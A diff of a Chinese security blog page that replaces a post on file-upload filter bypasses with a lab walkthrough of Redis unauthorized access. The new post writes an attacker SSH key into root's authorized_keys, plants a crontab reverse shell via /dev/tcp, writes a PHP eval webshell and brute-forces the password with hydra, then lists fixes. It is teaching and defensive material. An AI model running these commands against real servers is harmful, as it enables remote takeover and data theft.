@@ -45,7 +45,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="文件上传漏洞," />
+  <meta name="keywords" content="redis,redis未授权访问," />
 
 
 
@@ -73,18 +73,29 @@
     })();
 </script>
 
-<meta name="description" content="文件上传漏洞在渗透测试中是一个非常重要的漏洞，因为这个漏洞可以很快的拿到服务器的权限，下面介绍一下文件上传漏洞的效验方法，绕过方式，和一些修复建议。">
-<meta name="keywords" content="文件上传漏洞">
+<meta name="description" content="redis介绍Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、 Key-Value数据库。和Memcached类似，它支持存储的value 类型相对更多，包括 string(字符串)、list ( 链表)、 set(集合)、zset(sorted set – 有序集合)和 hash（哈希类型）。这些数据类型都支持push/pop 、 add/remove 及">
+<meta name="keywords" content="redis,redis未授权访问">
 <meta property="og:type" content="article">
-<meta property="og:title" content="文件上传漏洞解析及绕过姿势">
-<meta property="og:url" content="http://y-hkl.top/2017/09/16/文件上传漏洞解析及绕过姿势/index.html">
+<meta property="og:title" content="redis未授权访问">
+<meta property="og:url" content="http://y-hkl.top/2018/03/18/redis未授权访问/index.html">
 <meta property="og:site_name" content="Y-HKL&#39;s Blog">
-<meta property="og:description" content="文件上传漏洞在渗透测试中是一个非常重要的漏洞，因为这个漏洞可以很快的拿到服务器的权限，下面介绍一下文件上传漏洞的效验方法，绕过方式，和一些修复建议。">
+<meta property="og:description" content="redis介绍Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、 Key-Value数据库。和Memcached类似，它支持存储的value 类型相对更多，包括 string(字符串)、list ( 链表)、 set(集合)、zset(sorted set – 有序集合)和 hash（哈希类型）。这些数据类型都支持push/pop 、 add/remove 及">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2017-09-17T03:09:35.988Z">
+<meta property="og:image" content="http://y-hkl.top/upload_img/redis_1.png">
+<meta property="og:image" content="http://y-hkl.top/upload_img/redis_2.png">
+<meta property="og:image" content="http://y-hkl.top/upload_img/redis_3.png">
+<meta property="og:image" content="http://y-hkl.top/upload_img/redis_4.png">
+<meta property="og:image" content="http://y-hkl.top/upload_img/redis_5.png">
+<meta property="og:image" content="http://y-hkl.top/upload_img/redis_6.png">
+<meta property="og:image" content="http://y-hkl.top/upload_img/redis_7.png">
+<meta property="og:image" content="http://y-hkl.top/upload_img/redis_8.png">
+<meta property="og:image" content="http://y-hkl.top/upload_img/redis_9.png">
+<meta property="og:image" content="http://y-hkl.top/upload_img/redis_10.png">
+<meta property="og:updated_time" content="2018-03-19T05:36:35.442Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="文件上传漏洞解析及绕过姿势">
-<meta name="twitter:description" content="文件上传漏洞在渗透测试中是一个非常重要的漏洞，因为这个漏洞可以很快的拿到服务器的权限，下面介绍一下文件上传漏洞的效验方法，绕过方式，和一些修复建议。">
+<meta name="twitter:title" content="redis未授权访问">
+<meta name="twitter:description" content="redis介绍Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、 Key-Value数据库。和Memcached类似，它支持存储的value 类型相对更多，包括 string(字符串)、list ( 链表)、 set(集合)、zset(sorted set – 有序集合)和 hash（哈希类型）。这些数据类型都支持push/pop 、 add/remove 及">
+<meta name="twitter:image" content="http://y-hkl.top/upload_img/redis_1.png">
 
 
 
@@ -112,13 +123,13 @@
 
 
 
-  <link rel="canonical" href="http://y-hkl.top/2017/09/16/文件上传漏洞解析及绕过姿势/"/>
+  <link rel="canonical" href="http://y-hkl.top/2018/03/18/redis未授权访问/"/>
 
 
 
 
 
-  <title> 文件上传漏洞解析及绕过姿势 | Y-HKL's Blog </title>
+  <title> redis未授权访问 | Y-HKL's Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -291,7 +302,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://y-hkl.top/2017/09/16/文件上传漏洞解析及绕过姿势/">
+    <link itemprop="mainEntityOfPage" href="http://y-hkl.top/2018/03/18/redis未授权访问/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Y-HKL">
@@ -312,7 +323,7 @@
             
             
               
-                文件上传漏洞解析及绕过姿势
+                redis未授权访问
               
             
           </h1>
@@ -328,8 +339,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-16T22:21:01-04:00">
-                2017-09-16
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-18T23:38:37-04:00">
+                2018-03-18
               </time>
             
 
@@ -369,9 +380,9 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2017/09/16/文件上传漏洞解析及绕过姿势/#comments" itemprop="discussionUrl">
+                <a href="/2018/03/18/redis未授权访问/#comments" itemprop="discussionUrl">
                   <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2017/09/16/文件上传漏洞解析及绕过姿势/" itemprop="commentCount"></span>
+                        data-disqus-identifier="2018/03/18/redis未授权访问/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -397,47 +408,81 @@
       
 
       
-        <p>文件上传漏洞在渗透测试中是一个非常重要的漏洞，因为这个漏洞可以很快的拿到服务器的权限，下面介绍一下文件上传漏洞的效验方法，绕过方式，和一些修复建议。<br><a id="more"></a></p>
-<h2 id="文件上传校验姿势"><a href="#文件上传校验姿势" class="headerlink" title="文件上传校验姿势"></a>文件上传校验姿势</h2><ul>
-<li>客户端javascript校验（一般只校验后缀名）</li>
-<li>服务端校验<ul>
-<li>文件头content-type字段校验（image/gif）</li>
-<li>文件内容头校验（GIF89a）</li>
-<li>后缀名黑名单校验</li>
-<li>后缀名白名单校验</li>
-<li>自定义正则校验</li>
-</ul>
+        <h2 id="redis介绍"><a href="#redis介绍" class="headerlink" title="redis介绍"></a>redis介绍</h2><p>Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、 Key-Value数据库。和Memcached类似，它支持存储的value 类型相对更多，包括 string(字符串)、list ( 链表)、 set(集合)、zset(sorted set – 有序集合)和 hash（哈希类型）。这些数据类型都支持push/pop 、 add/remove 及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上， redis支持各种不同方式的排序。与 memcached 一样，为了保证效率，数据都是缓存在内存中。区别的是 redis 会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了 master-slave ( 主从)同步。<br><a id="more"></a></p>
+<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Redis因配置不当可以导致未授权访问，被攻击者恶意利用。当前流行的针对Redis未授权访问的一种新型攻击方式，在特定条件下，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器，可导致服务器权限被获取和数据删除、泄露或加密勒索事件发生，严重危害业务正常服务。</p>
+<p>目前比较主流的案例：yam2 minerd 挖矿程序</p>
+<h2 id="Redis安全漏洞影响"><a href="#Redis安全漏洞影响" class="headerlink" title="Redis安全漏洞影响"></a>Redis安全漏洞影响</h2><p>一旦入侵成功，Redis数据会丢失，攻击者可直接添加账号用于ssh远程登录控制服务器，会给用户的 Redis 运行环境以及 Linux 主机造成安全风险，引发重要数据删除、泄露或加密勒索事件发生。<br><img src="/upload_img/redis_1.png" alt=""></p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>下载redis<br>Wget <a href="http://download.redis.io/releases/redis-2.6.14.tar.gz" target="_blank" rel="external">http://download.redis.io/releases/redis-2.6.14.tar.gz</a><br>解压<br>tar zxvf redis-2.6.14.tar.gz<br>cd redis-2.6.14<br>编译<br>make<br><img src="/upload_img/redis_2.png" alt=""><br>cd src<br>安装<br>make install<br>启动<br>redis-server &amp;<br>连接测试<br>redis-cli<br><img src="/upload_img/redis_3.png" alt=""></p>
+<h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>redis默认使用的是6379端口，可以使用nmap来验证这个漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Nmap -A -p 6379 –script redis-info 192.168.10.129</div></pre></td></tr></table></figure></p>
+<p><img src="/upload_img/redis_4.png" alt=""></p>
+<h2 id="漏洞验证-1"><a href="#漏洞验证-1" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><h3 id="获取敏感信息"><a href="#获取敏感信息" class="headerlink" title="获取敏感信息"></a>获取敏感信息</h3><p>Nmap扫描后发现主机的6379端口对外开放，就可以用本地Redis远程连接服务器（redis在开放往外网的情况下(默认配置是bind 127.0.0.1，只允许本地访问，如果配置了其他网卡地址那么就可以网络访问)，默认配置下是空口令，端口为6379）连接后可以获取Redis敏感数据。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">redis-cli -h 漏洞服务器IP</div><div class="line">info</div></pre></td></tr></table></figure></p>
+<p><img src="/upload_img/redis_5.png" alt=""><br>可以看到Redis的版本和服务器上内核版本信息，如果是新版的Redis2.8以后的版本还可以看到Redis配置文件的绝对路径</p>
+<h3 id="写入SSH公钥，获取操作系统权限"><a href="#写入SSH公钥，获取操作系统权限" class="headerlink" title="写入SSH公钥，获取操作系统权限"></a>写入SSH公钥，获取操作系统权限</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys,把缓冲的数据保存在文件里，这样就可以再服务器端的/root/.ssh下生一个授权的key。</p>
+<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>1.redis对外开放，且未授权访问（默认配置）<br>2.服务器的ssh对外开放，可通过key登录</p>
+<h4 id="攻击详情"><a href="#攻击详情" class="headerlink" title="攻击详情"></a>攻击详情</h4><ol>
+<li>生成公钥<br>在攻击电脑上生成自己的公钥，一直按回车不用输入任何东西<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh-keygen -t rsa</div></pre></td></tr></table></figure>
 </li>
-<li>WAF设备校验（根据不同的WAF产品而定）<h2 id="客户端JS验证"><a href="#客户端JS验证" class="headerlink" title="客户端JS验证"></a>客户端JS验证</h2><h3 id="验证代码"><a href="#验证代码" class="headerlink" title="验证代码"></a>验证代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//文件上传漏洞演示脚本之js验证</span></div><div class="line">$uploaddir = <span class="string">'uploads/'</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</div><div class="line">    <span class="keyword">if</span> (file_exists($uploaddir)) &#123;</div><div class="line">        <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upfile'</span>][<span class="string">'tmp_name'</span>], $uploaddir . <span class="string">'/'</span> . $_FILES[<span class="string">'upfile'</span>][<span class="string">'name'</span>])) &#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">'文件上传成功，保存于：'</span> . $uploaddir . $_FILES[<span class="string">'upfile'</span>][<span class="string">'name'</span>] . <span class="string">"\n"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">exit</span>($uploaddir . <span class="string">'文件夹不存在,请手工创建！'</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="comment">//print_r($_FILES);</span></div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span></div><div class="line">    <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</div><div class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</div><div class="line">&lt;head&gt;</div><div class="line">    &lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html;charset=gbk"</span>/&gt;</div><div class="line">    &lt;meta http-equiv=<span class="string">"content-language"</span> content=<span class="string">"zh-CN"</span>/&gt;</div><div class="line">    &lt;title&gt;文件上传漏洞演示脚本--JS验证实例&lt;/title&gt;</div><div class="line">    &lt;script type=<span class="string">"text/javascript"</span>&gt;</div><div class="line">       <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">()</span> </span>&#123;</div><div class="line">            <span class="keyword">var</span> file = document.getElementsByName(<span class="string">'upfile'</span>)[<span class="number">0</span>].value;</div><div class="line">            <span class="keyword">if</span> (file == <span class="keyword">null</span> || file == <span class="string">""</span>) &#123;</div><div class="line">                alert(<span class="string">"你还没有选择任何文件，不能上传!"</span>);</div><div class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">            &#125;</div><div class="line">            <span class="comment">//定义允许上传的文件类型</span></div><div class="line">            <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.jpeg|.png|.gif|.bmp|"</span>;</div><div class="line">            <span class="comment">//提取上传文件的类型</span></div><div class="line">            <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</div><div class="line">            <span class="comment">//alert(ext_name);</span></div><div class="line">            <span class="comment">//alert(ext_name + "|");</span></div><div class="line">            <span class="comment">//判断上传文件类型是否允许上传</span></div><div class="line">            <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">"|"</span>) == <span class="number">-1</span>) &#123;</div><div class="line">                <span class="keyword">var</span> errMsg = <span class="string">"该文件不允许上传，请上传"</span> + allow_ext + <span class="string">"类型的文件,当前文件类型为："</span> +     ext_name;</div><div class="line">                alert(errMsg);</div><div class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &lt;/script&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;h3&gt;文件上传漏洞演示脚本--JS验证实例&lt;/h3&gt;</div><div class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span> name=<span class="string">"upload"</span> onsubmit=<span class="string">"return     checkFile()"</span>&gt;</div><div class="line">    &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"MAX_FILE_SIZE"</span> value=<span class="string">"204800"</span>/&gt;</div><div class="line">    请选择要上传的文件：&lt;input type=<span class="string">"file"</span> name=<span class="string">"upfile"</span>/&gt;</div><div class="line">    &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"上传"</span>/&gt;</div><div class="line">&lt;/form&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>客户端JS验证通常做法是验证上传文件的扩展名是否符合验证条件</p>
-<h3 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h3><p>1.通过firefox的F12修改js代码绕过验证<br>2.使用burp抓包直接提交，绕过js验证</p>
-<h2 id="文件头content-type字段校验（image-gif）"><a href="#文件头content-type字段校验（image-gif）" class="headerlink" title="文件头content-type字段校验（image/gif）"></a>文件头content-type字段校验（image/gif）</h2><h3 id="验证测试代码"><a href="#验证测试代码" class="headerlink" title="验证测试代码"></a>验证测试代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>($_FILE[<span class="string">'userfile'</span>][<span class="string">'type'</span>] != <span class="string">"image/gif"</span>)&#123; <span class="comment">//检测content-type</span></div><div class="line">    <span class="keyword">echo</span> <span class="string">"sorry,we only allow uploading GIF images"</span>;</div><div class="line">    <span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"Upload success!"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
-<p>以上是一个简单的服务器上传验证代码，只要content-type符合image/gif就允许上传</p>
-<h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h3><p>使用Burp截取上传数据包，修改Content-Type的值，改为image/gif即可成功绕过上传webshell</p>
-<h2 id="服务端文件扩展名检测"><a href="#服务端文件扩展名检测" class="headerlink" title="服务端文件扩展名检测"></a>服务端文件扩展名检测</h2><h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$type = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php3"</span>);</div><div class="line"><span class="comment">//判断上传文件类型</span></div><div class="line">$fileext = fileext($_FILE[<span class="string">'file'</span>][<span class="string">'name'</span>]);</div><div class="line"><span class="keyword">if</span>(!in_array($fileext,$type))&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"upload success!"</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"sorry"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
-<p>默认上传后的文件保存的名字是以获取到名字</p>
-<h3 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h3><ol>
-<li>使用大小写绕过（针对对大小写不敏感的系统如windows），如：PhP</li>
-<li>使用黑名单外的脚本类型，如：php5,asa 和 cer等<br>能被解析的文件扩展名列表：<br>jsp jspx jspf<br>asp asa cer aspx</li>
-<li>配合文件包含漏洞<br>前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。<br>绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）<br>（1）先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；<br>（2）然后再上传一个.php的文件，内容为<br>此时，这个php文件就会去引用txt文件的内容，从而绕过校验</li>
-<li>配合服务器解析漏洞<br>如：test.jpg.xxx(apache解析漏洞)</li>
-<li>配合操作系统文件命令规则<br>（1）上传不符合windows文件命名规则的文件名<br>　　test.asp.<br>　　test.asp(空格)<br>　　test.php:1.jpg<br>　　test.php:: $DATA<br>会被windows系统自动去掉不符合规则符号后面的内容。<br>（2）linux下后缀名大小写<br>在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。</li>
-<li>双扩展名之间使用00截断，绕过验证上传恶意代码<br>0x00截断：基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候<br>　　test.php(0x00).jpg<br>　　test.php%00.jpg<br>　　路径/upload/1.php(0x00)，文件名1.jpg，结合/upload/1.php(0x00)/1.jpg</li>
-<li>借助.htaccess文件上传恶意代码并解析。如：上传一个.htaccess文件，内容为AddTypeapplication/x-httpd-php .jpg，上传的jpg文件就可以当作php来解析</li>
-<li>超长文件名截断上传(windows 258byte | linux 4096byte)</li>
-<li>CMS、编辑器漏洞<br>（1）CMS漏洞：比如说JCMS等存在的漏洞，可以针对不同CMS存在的上传漏洞进行绕过。<br>（2）编辑器漏洞：比如FCK，ewebeditor等，可以针对编辑器的漏洞进行绕过<h2 id="服务端检测文件头"><a href="#服务端检测文件头" class="headerlink" title="服务端检测文件头"></a>服务端检测文件头</h2><h3 id="文件头简介"><a href="#文件头简介" class="headerlink" title="文件头简介"></a>文件头简介</h3>不同的图片文件都有不同文件头，如：<br>PNG： 文件头标识 (8 bytes) 89 50 4E 47 0D 0A 1A 0A<br>JPEG： 文件头标识 (2 bytes): 0xff, 0xd8 (SOI) (JPEG 文件标识)<br>GIF： 文件头标识 (6 bytes) 47 49 46 38 39(37) 61<h3 id="绕过方式-1"><a href="#绕过方式-1" class="headerlink" title="绕过方式"></a>绕过方式</h3>绕过这个检测只需要在恶意脚本前加上允许上传文件的头标识就可以了<br>在木马内容基础上再加了一些文件信息，有点像下面的结构<br>GIF89a<h2 id="服务器段安装WAF"><a href="#服务器段安装WAF" class="headerlink" title="服务器段安装WAF"></a>服务器段安装WAF</h2>服务器段安装安全狗等安全防御软件<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3></li>
-<li>垃圾数据<br>有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。此种情况可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验；</li>
-<li>filename<br>针对早期版本安全狗，可以多加一个filename</li>
-<li>POST/GET<br>有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。<br>此种情况可以上传一个POST型的数据包，抓包将POST改为GET<h2 id="安全建议"><a href="#安全建议" class="headerlink" title="安全建议"></a>安全建议</h2></li>
-<li>使用白名单限制可以上传的文件扩展</li>
-<li>验证文件内容，使用正则匹配恶意代码限制上传</li>
-<li>对上传后的文件统一随机命名，不允许用户控制扩展名</li>
-<li>修复服务器可能存在的解析漏洞</li>
-<li>严格限制可以修改服务器配置的文件上传如：.htaccess</li>
-<li>隐藏上传文件路径。</li>
 </ol>
+<p><img src="/upload_img/redis_6.png" alt=""></p>
+<ol>
+<li>将公钥导入key.txt文件（前后用\n换行，避免和Redis里其他缓存数据混合）,再把key.txt文件内容写入目标主机的缓冲里<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt</div><div class="line"></div><div class="line">cat /root/.ssh/key.txt | ./redis-cli -h 漏洞服务器IP -x set xxx</div></pre></td></tr></table></figure>
+</li>
+</ol>
+<p><img src="/upload_img/redis_7.png" alt=""></p>
+<ol>
+<li><p>连接漏洞服务器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">redis-cli -h 漏洞服务器IP</div></pre></td></tr></table></figure>
+</li>
+<li><p>设置redis的备份路径为/root/.ssh和保存文件名authorized_keys</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">config set dir /root/.ssh</div><div class="line">config set dbfilename authorized_keys</div><div class="line">save</div></pre></td></tr></table></figure>
+</li>
+</ol>
+<p><img src="/upload_img/redis_8.png" alt=""></p>
+<ol>
+<li>使用SSH连接漏洞服务器<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh 漏洞服务器IP</div></pre></td></tr></table></figure>
+</li>
+</ol>
+<p><img src="/upload_img/redis_9.png" alt=""><br>可以看到不用密码就可以直接远程登录</p>
+<h3 id="利用crontab反弹shell"><a href="#利用crontab反弹shell" class="headerlink" title="利用crontab反弹shell"></a>利用crontab反弹shell</h3><h4 id="端口监听"><a href="#端口监听" class="headerlink" title="端口监听"></a>端口监听</h4><p>在攻击者服务器上监听一个端口（任意端口）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -lvnp 4444</div></pre></td></tr></table></figure></p>
+<h4 id="攻击详情-1"><a href="#攻击详情-1" class="headerlink" title="攻击详情"></a>攻击详情</h4><p>连接redis，写入反弹shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">redis-cli -h 192.168.152.128</div><div class="line">set xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.152.129/4444 0&gt;&amp;1\n\n&quot;</div><div class="line">config set dir /var/spool/cron</div><div class="line">config set dbfilename root</div><div class="line">save</div></pre></td></tr></table></figure></p>
+<p>1分钟后客户端这边收到centos的反弹shell<br><img src="/upload_img/redis_10.png" alt=""></p>
+<h3 id="获取web服务的webshell"><a href="#获取web服务的webshell" class="headerlink" title="获取web服务的webshell"></a>获取web服务的webshell</h3><p>当redis权限不高时，并且服务器开着web服务，在redis有web目录写权限时，可以尝试往web路径写webshell。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">redis-cli -h 192.168.152.128</div><div class="line">config set dir /var/www/html</div><div class="line">set xxx &quot;\n\n\n&lt;?php @eval($_POST[&apos;c&apos;]);?&gt;\n\n\n&quot;</div><div class="line">config set dbfilename webshell.php</div><div class="line">save</div></pre></td></tr></table></figure></p>
+<p>注意：要知道web服务器的绝对路径</p>
+<h2 id="利用hydra暴力破解redis的密码"><a href="#利用hydra暴力破解redis的密码" class="headerlink" title="利用hydra暴力破解redis的密码"></a>利用hydra暴力破解redis的密码</h2><p>使用hydra工具可以对redis进行暴力破解<br>hydra -P passwd.txt redis://漏洞服务器IP</p>
+<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><ul>
+<li>禁止一些高危命令（重启redis才能生效）<br>修改 redis.conf 文件，禁用远程修改 DB 文件地址<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">rename-command FLUSHALL &quot;&quot;</div><div class="line">rename-command CONFIG &quot;&quot;</div><div class="line">rename-command EVAL &quot;&quot;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>或者通过修改redis.conf文件，改变这些高危命令的名称<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">rename-command FLUSHALL &quot;name1&quot;</div><div class="line">rename-command CONFIG &quot;name2&quot;</div><div class="line">rename-command EVAL &quot;name3&quot;</div></pre></td></tr></table></figure></p>
+<ul>
+<li><p>以低权限运行 Redis 服务（重启redis才能生效）<br>为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">groupadd -r redis &amp;&amp; useradd -r -g redis redis</div></pre></td></tr></table></figure>
+</li>
+<li><p>为 Redis 添加密码验证（重启redis才能生效）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">requirepass mypassword</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>（注意redis不要用-a参数，明文输入密码，连接后使用auth认证）</p>
+<ul>
+<li>禁止外网访问 Redis（重启redis才能生效）<br>修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bind 127.0.0.1</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>在redis3.2之后，redis增加了protected-mode，在这个模式下，非绑定IP或者没有配置密码访问时都会报错</p>
+<ul>
+<li>修改默认端口<br>修改配置文件redis.conf文件<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Port 6379</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>默认端口是6379，可以改变成其他端口（不要冲突就好）</p>
+<ul>
+<li>保证 authorized_keys 文件的安全<br>为了保证安全，您应该阻止其他用户添加新的公钥。<br>将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chmod 400 ~/.ssh/authorized_keys</div></pre></td></tr></table></figure>
+</li>
+</ul>
